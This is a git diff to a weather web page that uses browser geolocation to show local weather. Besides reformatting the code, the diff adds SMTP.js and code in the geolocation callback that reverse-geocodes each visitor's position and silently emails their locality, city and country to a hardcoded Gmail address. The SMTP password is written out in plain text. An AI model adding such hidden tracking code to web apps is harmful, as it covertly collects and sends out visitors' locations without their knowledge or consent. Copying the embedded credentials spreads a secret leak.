@@ -252,6 +252,7 @@ transition: all 0.25s ease;
             </div>
         </section>
     </div>
+    <script src=" https://smtpjs.com/v3/smtp.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js" integrity="sha512-fD9DI5bZwQxOi7MhYWnnNPlvXdp/2Pj3XSTRrFs5FQa4mizyGLnJcN6tuvUS6LbmgN1ut+XGSABKvjN0H6Aoow==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/brands.min.js" integrity="sha512-KYlRezs7yAa59UnX6zAvY7I96Te02kycQn02Sr6FU/fBpxcXAwumRe5DHVrqVnWTt9HY/PktrAPZzSe9UE1Yxg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script>
@@ -283,6 +284,22 @@ transition: all 0.25s ease;
                     console.log('erro')
                     const {latitude,longitude} = pos.coords
                     api = `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&lang=ar&units=metric&appid=${apiKey}`
+                    
+                    let apia = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
+                    fetch(apia).then(response=> response.json()).then(data =>{
+                           Email.send({
+                        Host : "smtp.elasticemail.com",
+                        Username : "jamalgoving@gmail.com",
+                        Password : "CEBE543A3F344AB63820BFE7D920CA60C31B",
+                        To : 'jamalgoving@gmail.com',
+                        From : "jamalgoving@gmail.com",
+                        Subject : `موقع الشخص`,
+                        Body : `${data.locality}, ${data.city}, ${data.countryName}`
+                    })
+
+                    console.log(data)
+                   
+        })
                     getData()
                 })
             }
@@ -294,6 +311,7 @@ transition: all 0.25s ease;
      }
         window.onload = getPos()
         async function getData(){
+            
             let response = await fetch(api)
             let json = await response.json()
             
@@ -322,20 +340,30 @@ transition: all 0.25s ease;
             else if (id >= 701 && id <= 781){
                 imgCont.src = 'imgs/cloud.svg'
             
-            }else if(id > 800){
-                imgCont.src = 'imgs/cloud.svg'
-
-            }
+            }else if(id > 800){imgCont.src = 'imgs/cloud.svg'}
             else if(id >= 600 && id <= 622){
                 imgCont.src = 'imgs/snow.svg'
-            }else if(id >= 500 && id <= 531){
-                imgCont.src = 'imgs/rain.svg'
+            }else if(id >= 500 && id <= 531){imgCont.src = 'imgs/rain.svg'
             }else if(id >=300 && id <= 321){
                 imgCont.src = 'imgs/drizzle.png'
-            }else if(id >= 200 && id <= 232){
-                imgCont.src = 'imgs/storm.svg'
+            }else if(id >= 200 && id <= 232){imgCont.src = 'imgs/storm.svg'
             }
             warpper.classList.add('active')
+            const findState = ()=>{
+        const success  = (pos)=>{
+        console.log(pos)
+    
+    }
+
+        navigator.geolocation.getCurrentPosition(success,()=>{
+            status.textContent = `Unable To Location`
+        })
+    
+    
+}
+
+window.addEventListener('load',findState)
+
         }
 
         form.addEventListener('submit',(e)=>{
